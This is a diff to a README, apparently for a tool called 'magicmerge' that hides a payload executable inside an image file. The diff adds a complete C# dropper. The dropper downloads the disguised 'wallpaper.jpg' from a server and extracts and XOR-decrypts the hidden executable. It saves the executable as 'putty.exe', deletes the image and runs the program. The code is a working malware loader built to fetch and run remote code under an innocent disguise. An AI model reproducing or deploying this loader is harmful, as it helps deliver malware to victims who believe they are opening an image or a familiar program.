@@ -94,3 +94,141 @@ magicmerge.exe -payload="/payload.exe" -url=false -ngrok=false
 - Web Dashboard
 - Auto SSL Cert generate
 - Log File
+
+<h> Client code sample (C#): </h2>
+
+```
+ internal class Program
+ {
+
+     static void Main(string[] args)
+     {
+         string pathToCombinedFile = "wallpaper.jpg";
+         string outputPath = "putty.exe";
+         DownloadPayload("http://localhost:8080/wallpaper",pathToCombinedFile);
+         ExtractAndDecryptExecutable(pathToCombinedFile, outputPath);
+         File.Delete(pathToCombinedFile);
+         Process.Start(outputPath);
+     }
+
+
+     public static void DownloadPayload(string URL,string path)
+     {
+         using (WebClient client = new WebClient())
+         {
+             try
+             {
+                 client.DownloadFile(URL, path);
+                 Console.WriteLine("Download completed successfully.");
+             }
+             catch (Exception ex)
+             {
+                 Console.WriteLine("An error occurred: " + ex.Message);
+             }
+         }
+
+     }
+     public static void ExtractAndDecryptExecutable(string combinedFilePath, string outputExePath)
+     {
+         try
+         {
+             byte[] combinedData = File.ReadAllBytes(combinedFilePath);
+
+             int keyLength = 16;
+             byte[] key = new byte[keyLength];
+             Array.Copy(combinedData, combinedData.Length - keyLength, key, 0, keyLength);
+
+             byte[] delimiter = new byte[] { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
+             int delimiterIndex = IndexOf(combinedData, delimiter);
+
+             if (delimiterIndex == -1)
+             {
+                 Console.WriteLine("Delimiter not found.");
+                 return;
+             }
+
+             int startOfExe = delimiterIndex + delimiter.Length;
+             int exeLength = combinedData.Length - startOfExe - keyLength;
+
+             if (exeLength <= 0)
+             {
+                 Console.WriteLine("No executable data found.");
+                 return;
+             }
+
+             byte[] exeData = new byte[exeLength];
+             for (int i = 0; i < exeData.Length; i++)
+             {
+                 exeData[i] = (byte)(combinedData[startOfExe + i] ^ key[i % key.Length]);
+             }
+
+             File.WriteAllBytes(outputExePath, exeData);
+             Console.WriteLine($"Executable has been extracted and decrypted to {outputExePath}");
+         }
+         catch (Exception ex)
+         {
+             Console.WriteLine($"An error occurred: {ex.Message}");
+         }
+     }
+
+     private static int IndexOf(byte[] source, byte[] pattern)
+     {
+         int[] lps = ComputeLpsArray(pattern);
+         int i = 0;  
+         int j = 0;  
+         while (i < source.Length)
+         {
+             if (pattern[j] == source[i])
+             {
+                 j++;
+                 i++;
+             }
+             if (j == pattern.Length)
+             {
+                 return i - j;
+             }
+             else if (i < source.Length && pattern[j] != source[i])
+             {
+                 if (j != 0)
+                     j = lps[j - 1];
+                 else
+                     i = i + 1;
+             }
+         }
+         return -1;
+     }
+
+     private static int[] ComputeLpsArray(byte[] pattern)
+     {
+         int length = 0;
+         int i = 1;
+         int[] lps = new int[pattern.Length];
+         lps[0] = 0;
+
+         while (i < pattern.Length)
+         {
+             if (pattern[i] == pattern[length])
+             {
+                 length++;
+                 lps[i] = length;
+                 i++;
+             }
+             else
+             {
+                 if (length != 0)
+                 {
+                     length = lps[length - 1];
+                 }
+                 else
+                 {
+                     lps[i] = 0;
+                     i++;
+                 }
+             }
+         }
+         return lps;
+     }
+
+ }
+
+```
